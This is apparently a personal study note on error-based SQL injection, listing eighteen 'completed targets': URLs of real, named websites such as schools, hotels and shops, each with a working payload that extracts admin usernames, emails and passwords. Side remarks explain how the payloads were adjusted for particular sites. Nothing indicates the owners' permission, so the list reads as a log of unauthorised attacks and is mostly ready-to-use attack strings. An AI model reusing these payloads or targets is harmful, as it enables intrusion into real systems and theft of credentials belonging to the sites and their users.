# <mark style="background: #FF5582A6;">Prerequisite :</mark> 

Knowing How To Work With Burp Suite 
[[12-Xpath Injection]]
[[13-Double Query]]

# <mark style="background: #FFB86CA6;">Completed Targets : </mark> 

1. https://www.maapet.com/gallery-list.php?id=-15%27%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(password)%20from%20admin_login%20limit%200,1)))--+

	

2. http://hiriketiyabeach.lk/room-view.php?id=1%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(username)%20from%20user%20limit%200,1)))--

	

3. http://firoozgar.behkima.ir/lms/view.php?id=22590%27%20and%20updatexml(null,concat(0x3a,(select%20concat(user_email)%20from%20ap_users%20limit%200,1)),null)--+

	

4. https://www.pharmacongignos.in/product.php?id=9%20&%20cat_id=%203%27%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(admin_name)%20from%20administrators%20limit%200,1)))--+

	

5. https://www.pbw-india.com/category.php?id=2%20and%20/*!12345extractvalue(rand(),CONCAT(0x7e,(select%20CONCAT(user_email)%20from/**/user_info%20limit%200,1)))*/--

	

6. https://www.jasmineexports.com/category.php?catid=2%20and%20extractvalue(rand(),concat(0x7e,(select%20column_name%20from%20information_schema.columns%20where%20table_name=%27tbladmin%27%20limit%202,1)))--

	(it didin't have a column for the name of the user, but it had the loginid column)

	

7. https://www.htps.edu.hk/en/school.php?id=19%27%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(usr_name)%20from%20usr%20limit%200,1)))--+

	

	- (https://www.htps.edu.hk/en/school.php?id=19%27%20and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(usr_pwd)%20as%20char),0x7e))%20from%20holytrinity.usr%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--+)

8. https://www.lkh.com.sg/news.php?id=3%20and%20updatexml(null,concat(0x3a,(select%20concat(user_name)%20from%20user%20limit%200,1)),null)--

	

	(when we delete the 0x3a to show the password as complete, the site loaded without any error and it doesn't have [[13-Double Query]])

9. https://acebaypointe.com/post.php?id=28%20and%20/*!12345extractvalue(rand(),CONCAT(0x7e,(select%20CONCAT(username)%20from/**/tbl_user%20limit%200,1)))*/--

	

10. http://sinchung.com.my/tour.php?id=26%27%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(username)%20from%20control_login%20limit%200,1)))--+

	

11. http://www.saleemcarpets.com/prod_detail.php?ID=10%27%20and%20/*!12345extractvalue(rand(),CONCAT(0x7e,(select%20CONCAT(username)%20from/**/user%20limit%200,1)))*/--+

	

	<mark style="background: #FF5582A6;">Point :</mark> 
	when we delete the 0x7e to show the password as complete, the site loaded without any error)
	(it doesn't have [[13-Double Query]], only the combined way with
	[[02-Sql Injection (Basic)]] may work, in this way, we have found the name of the important table and the important columns, so we extract the information we want as follow :
	- <mark style="background: #FFB86CA6;">union select 1,2,3,4,5,password,7,8,9 from admin--</mark> 

12. http://stpbusiness.st/single.php?id_p=30%27%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(email)%20from%20usuario%20limit%200,1)))--+

	
	(when we delete the 0x7e to show the password as complete, the site loaded without any error) ---> [[13-Double Query]]

	

	- http://stpbusiness.st/single.php?id_p=30%27%20and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(senha)%20as%20char),0x7e))%20from%20stpbusiness.usuario%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--+

13. https://www.satoribike.com/pro.php?m=d&pid=80&cid=15&f=14%27%20and%20/*!12345extractvalue(rand(),CONCAT(0x7e,(select%20CONCAT(username)%20from/**/managers_eng%20limit%200,1)))*/--+

	

14. http://artworkshop.co.uk/newsdetail.php?NewsID=160%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(Email)%20from%20members%20limit%200,1)))--

	
	(when we delete the 0x7e to show the password as complete, the site loaded without any error) ---> [[13-Double Query]]

	

	- http://artworkshop.co.uk/newsdetail.php?NewsID=160%20and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(password)%20as%20char),0x7e))%20from%20kdyrsxni_db1.members%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--

15. https://www.promare.be/shop.php?id=1%27%20and%20updatexml(null,concat(0x3a,(select%20concat(password)%20from%20%20tbl_login%20limit%200,1)),null)--+

	

16. http://www.embryohotel.com/room-detail.php?id=1%20And(select%201%20from(select%20count(*),concat(0x3a,(select%20substr(group_concat(username,0x3a,password),1,150)%20from%20admin%20where%20table_schema%20like%20database()),0x3a,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)z)--%20-
	
	

17. http://www.altcine.com/movie.php?id=-1940%27and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(password)%20as%20char),0x7e))%20from%20altcine_mems.users%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--+

	

18. http://www.marywardlubhu.edu.np/school.php?id=168&cat_id=23%27%20and%20extractvalue(rand(),concat((select%20concat(username)%20from%20tbl_admin%20limit%200,1)))--+

	